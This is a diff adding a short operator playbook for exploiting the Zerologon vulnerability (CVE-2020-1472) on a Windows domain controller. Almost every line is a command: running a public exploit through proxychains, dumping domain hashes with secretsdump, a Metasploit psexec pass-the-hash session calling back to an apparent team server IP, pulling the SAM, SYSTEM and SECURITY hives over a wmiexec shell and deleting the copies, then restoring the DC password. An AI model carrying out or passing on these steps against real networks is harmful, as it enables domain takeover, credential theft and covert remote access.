@@ -1,0 +1,27 @@
+1. obtain zero logon exploit/update imppacket https://github.com/VoidSec/CVE-2020-1472
+2. proxychains configured
+3. proxychains python3 cve-2020-1472-exploit.py -n <dcname> -t <dc ip>
+4. 	yes
+5.grab hashes
+	a. proxychains python3 secretsdump.py -no-pass -just-dc <domainname>/<dcname>/$@<dcip> >> hashes.txt
+	b. grab admin hash to psexec on to machine
+		1. in msfconsole use  windows/smb/psexec
+		2. set UN to administrator
+		3. set lhost to teams server public ip space 
+		4. set lport to whatever not in use
+		5. set smbpass to <administrator hash>
+		6. run
+To clean up zerologon:
+1. proxychains python3 wmiexec.py -hashes <administrator hash> <domain name>/administrator@<dcip>
+	a. will give you shell, run followin commands
+		1. - reg save HKLM\SYSTEM system.save
+		- reg save HKLM\SAM sam.save
+		- reg save HKLM\SECURITY security.save
+		- get system.save
+		- get sam.save
+		- get security.save
+		- del /f system.save
+		- del /f sam.save
+		- del /f security.save
+		2. run secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
+		3. proxychains python3 reinstall_original_pw.py <dc name> <dc ip> <administrator hash from previous dump>
